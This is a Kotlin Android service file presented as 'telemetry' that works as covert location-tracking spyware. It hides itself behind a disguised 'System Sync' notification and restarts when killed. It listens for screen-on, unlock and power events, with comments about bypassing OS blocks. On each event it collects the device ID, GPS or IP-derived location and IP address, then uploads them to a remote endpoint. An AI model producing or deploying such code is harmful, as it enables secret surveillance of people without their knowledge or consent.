package com.example.telemetry.sync

import android.annotation.SuppressLint
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.location.Location
import android.location.LocationManager
import android.net.ConnectivityManager
import android.net.Network
import android.os.IBinder
import android.provider.Settings
import androidx.core.app.NotificationCompat
import com.example.telemetry.BuildConfig
import com.example.telemetry.data.TelemetryDatabase
import com.example.telemetry.data.TelemetryRecord
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import org.json.JSONObject
import java.net.URL
import javax.net.ssl.HttpsURLConnection

class InstantTelemetryService : Service() {

    private val scope = CoroutineScope(Dispatchers.IO)
    private lateinit var connectivityManager: ConnectivityManager

    // Dynamically listen for hardware events (bypasses OS blocks)
    private val hardwareReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            intent?.action?.let { action ->
                logAndUploadInstantly("TRIGGER_${action.substringAfterLast(".")}")
            }
        }
    }

    // Instantly detect internet restoration
    private val networkCallback = object : ConnectivityManager.NetworkCallback() {
        override fun onAvailable(network: Network) {
            super.onAvailable(network)
            flushOfflineQueue()
        }
    }

    override fun onCreate() {
        super.onCreate()
        startDisguisedForeground()
        
        // Register listeners dynamically so they stay alive forever
        val filter = IntentFilter().apply {
            addAction(Intent.ACTION_POWER_CONNECTED)
            addAction(Intent.ACTION_USER_PRESENT)
            addAction(Intent.ACTION_SCREEN_ON)
        }
        registerReceiver(hardwareReceiver, filter)

        connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        connectivityManager.registerDefaultNetworkCallback(networkCallback)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY // If Android kills it, restart it automatically
    }

    override fun onDestroy() {
        unregisterReceiver(hardwareReceiver)
        connectivityManager.unregisterNetworkCallback(networkCallback)
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun startDisguisedForeground() {
        val channelId = "system_health_channel"
        val channel = NotificationChannel(channelId, "System Services", NotificationManager.IMPORTANCE_MIN).apply {
            description = "Maintains background device health connections"
            setShowBadge(false)
        }
        val manager = getSystemService(NotificationManager::class.java)
        manager.createNotificationChannel(channel)

        val notification = NotificationCompat.Builder(this, channelId)
            .setContentTitle("System Sync")
            .setContentText("Maintaining background services...")
            .setSmallIcon(android.R.drawable.ic_popup_sync)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build()

        startForeground(1, notification)
    }

    @SuppressLint("MissingPermission")
    private fun logAndUploadInstantly(eventType: String) {
        scope.launch {
            val hardwareId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown"
            val locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
            
            var lat = 0.0
            var lon = 0.0
            var finalEvent = eventType
            var ipAddr: String? = null

            try {
                val loc = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER)
                    ?: locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
                lat = loc?.latitude ?: 0.0
                lon = loc?.longitude ?: 0.0
            } catch (e: Exception) {}

            if (lat == 0.0 && lon == 0.0) {
                try {
                    val conn = URL("https://get.geojs.io/v1/ip/geo.json").openConnection() as HttpsURLConnection
                    conn.connectTimeout = 3000
                    val json = JSONObject(conn.inputStream.bufferedReader().readText())
                    lat = json.getString("latitude").toDouble()
                    lon = json.getString("longitude").toDouble()
                    ipAddr = json.getString("ip")
                } catch (e: Exception) {
                    finalEvent = "OFFLINE_$eventType"
                }
            }

            val dao = TelemetryDatabase.get(this@InstantTelemetryService).telemetryDao()
            dao.insert(TelemetryRecord(timestampMs = System.currentTimeMillis(), eventType = finalEvent, deviceId = hardwareId, latitude = lat, longitude = lon, ipAddress = ipAddr))
            
            flushOfflineQueue() // Try to upload immediately
        }
    }

    private fun flushOfflineQueue() {
        scope.launch {
            val dao = TelemetryDatabase.get(this@InstantTelemetryService).telemetryDao()
            val batch = dao.getUnsynced(100)
            if (batch.isNotEmpty()) {
                val uploader = TelemetryUploader(BuildConfig.TELEMETRY_ENDPOINT)
                if (uploader.upload(batch) is UploadOutcome.Success) {
                    dao.markSynced(batch.map { it.id })
                }
            }
        }
    }
}
